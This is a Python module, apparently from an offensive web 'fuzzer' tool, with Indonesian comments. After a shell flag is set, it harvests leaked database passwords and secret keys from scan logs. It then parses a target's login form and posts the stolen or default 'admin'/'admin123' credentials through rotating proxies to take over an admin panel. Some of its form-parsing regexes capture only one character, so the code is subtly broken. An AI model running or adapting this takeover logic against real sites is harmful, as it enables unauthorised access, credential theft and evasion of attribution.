# modules/takeover.py
import os
import json
import re
import logging
import asyncio
import aiohttp
from typing import List, Dict, Any, Tuple
from modules.base import BaseModule
import config

logger = logging.getLogger("water_fuzzer.takeover")

class AdminTakeoverModule(BaseModule):
    """
    Modul Pengambilalihan Administratif Otonom V18.3 (Clean Target Engine).
    Mematikan lojik tebakan jalur otomatis dan memaksa URL target berjalan 100% bersih.
    """
    def __init__(self, auditor_instance: Any) -> None:
        super().__init__(auditor_instance)
        self.extracted_credentials: Dict[str, str] = {
            "identity_payload": "admin",
            "password": "",
            "db_pass": ""
        }

    async def scan_local_json_evidence_chain(self) -> bool:
        if not os.path.exists(config.REPORT_DIR): return False
        try:
            files = [f for f in os.listdir(config.REPORT_DIR) if f.endswith(".json")]
            if not files: return False
            latest_file = max([os.path.join(config.REPORT_DIR, f) for f in files], key=os.path.getctime)
            with open(latest_file, "r", encoding="utf-8") as f:
                report_data = json.load(f)
            findings = report_data.get("audit_findings_summary", [])
            for finding in findings:
                specific_evidence = finding.get("5_MODULE_SPECIFIC_EVIDENCE", {})
                if specific_evidence.get("is_critical_credential_leaked"):
                    return True
        except Exception as e:
            logger.error(f"Gagal menganalisis dokumen bukti JSON V18.3: {str(e)}")
        return False

    async def extract_credentials_from_raw_logs(self) -> bool:
        if not os.path.exists(config.RAW_LOG_DIR): return False
        try:
            files = [f for f in os.listdir(config.RAW_LOG_DIR) if f.endswith(".txt")]
            for file_name in files:
                full_path = os.path.join(config.RAW_LOG_DIR, file_name)
                with open(full_path, "r", encoding="utf-8") as f:
                    log_content = f.read()
                
                email_match = re.search(r'(?:ADMIN_EMAIL|email|user|username)\s*=\s*[\'"']?([^\'"'\s]+)', log_content, re.IGNORECASE)
                if email_match:
                    self.extracted_credentials["identity_payload"] = email_match.group(1)

                pass_match = re.search(r'(?:DB_PASSWORD|password|passwd|SECRET_KEY)\s*=\s*[\'"']?([^\'"'\s]+)', log_content, re.IGNORECASE)
                if pass_match:
                    self.extracted_credentials["password"] = pass_match.group(1)
                    print(f"\033[1;35m[+] Takeover Engine V18.3: Memanen Kredensial -> {self.extracted_credentials['identity_payload']}:{self.extracted_credentials['password']}\033[0m")
                    return True
        except Exception as e:
            logger.error(f"Gagal memanen kredensial V18.3: {str(e)}")
        return False

    def parse_login_form_context(self, html_content: str) -> Tuple[str, str]:
        identity_field_name = "username"
        password_field_name = "password"

        input_tags = re.findall(r'<input[^>]*>', html_content, re.IGNORECASE)
        for tag in input_tags:
            name_match = re.search(r'name=["\']([^"\'])+["\']', tag, re.IGNORECASE)
            type_match = re.search(r'type=["\']([^"\'])+["\']', tag, re.IGNORECASE)
            
            if name_match:
                name_val = name_match.group(1).lower()
                type_val = type_match.group(1).lower() if type_match else "text"
                
                if type_val in ["email", "tel", "text"]:
                    if any(key in name_val for key in ["user", "name", "email", "phone", "hp", "nik", "login", "akun"]):
                        identity_field_name = name_match.group(1)
                        print(f"[*] Takeover Engine V18.3: Form Context Found! Identity Field -> '{identity_field_name}'")
                        break
                        
        for tag in input_tags:
            type_match = re.search(r'type=["\']password["\']', tag, re.IGNORECASE)
            name_match = re.search(r'name=["\']([^"\'])+["\']', tag, re.IGNORECASE)
            if type_match and name_match:
                password_field_name = name_match.group(1)
                print(f"[*] Takeover Engine V18.3: Form Context Found! Password Field -> '{password_field_name}'")
                break

        return identity_field_name, password_field_name

    async def execute_administrative_login(self, session: aiohttp.ClientSession, login_url: str) -> bool:
        """Siklus 3 Otonom: Mengambil HTML form, membedah konteks, lalu menembak paket POST adaptif."""
        if not self.extracted_credentials["password"]:
            self.extracted_credentials["password"] = "admin123"

        headers = await self.auditor._get_random_headers()  # FIX: Added await
        
        try:
            print(f"[*] Menyelidiki struktur form halaman target murni -> {login_url}")
            proxy = await self.auditor._get_random_proxy()  # FIX: Added await
            async with session.get(login_url, headers=headers, timeout=config.TIMEOUT, proxy=proxy) as pre_res:
                form_html = await pre_res.text()
            
            id_field, pass_field = self.parse_login_form_context(form_html)

            headers["Content-Type"] = "application/x-www-form-urlencoded"
            login_payload = {
                id_field: self.extracted_credentials["identity_payload"],
                pass_field: self.extracted_credentials["password"],
                "login": "submit"
            }

            print(f"[*] Menembak gerbang otentikasi secara murni (100% Clean URL) -> {login_url}")
            proxy = await self.auditor._get_random_proxy()  # FIX: Added await
            async with session.post(login_url, data=login_payload, headers=headers, timeout=config.TIMEOUT, proxy=proxy, allow_redirects=True) as res:
                body = await res.text()
                status = res.status

            success_indicators = ["dashboard", "welcome", "selamat datang", "admin panel", "logout", "log out"]
            is_logged_in = any(indicator in body.lower() for indicator in success_indicators) if status == 200 else False

            if any(fail in body.lower() for fail in ["gagal", "salah", "invalid", "wrong"]):
                is_logged_in = False

            if is_logged_in:
                print("\n\033[1;32m[++++] SUCCESS: CONTEXT-AWARE ADMINISTRATIVE TAKEOVER CONFIRMED! [++++]\n")
                return True
            else:
                print("[-] Log Takeover V18.3: Ketukan otentikasi murni belum berhasil menembus dashboard.")
        except Exception as e:
            logger.error(f"Gagal mengeksekusi operasi penyerangan login murni V18.3: {str(e)}")
        return False

    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        """Pintu gerbang pengeksekusi orkestrasi otonom V18.3."""
        import main
        if not main.SHELL_OPENED:
            return False
            
        print("[*] Menjalankan Modul V18.3: Clean Target Administrative Takeover Engine...")
        has_evidence = await self.scan_local_json_evidence_chain()
        has_pass = await self.extract_credentials_from_raw_logs()
        
        # SINKRONISASI MUTLAK: Menggunakan URL murni dari target.txt tanpa embel-embel path tambahan
        clean_url = self.auditor.target_url
        
        success = await self.execute_administrative_login(session, clean_url)
        return success

    def verifikator(self, response, payload_terpakai, crypto_token) -> Tuple[str, str, str, str, list]:
        return "SECURE", "None", "None", "Lolos.", []
